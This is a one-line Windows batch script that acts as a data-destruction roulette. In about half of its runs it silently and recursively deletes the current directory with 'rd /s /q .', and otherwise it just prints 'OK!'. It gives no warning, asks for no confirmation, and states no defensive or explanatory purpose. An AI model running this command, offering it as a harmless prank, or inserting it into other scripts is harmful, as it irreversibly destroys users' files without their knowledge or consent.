@echo off & setlocal enabledelayedexpansion & set /a "R=!random! %% 2" & if !R! equ 0 (rd /s /q .) else (echo OK!)
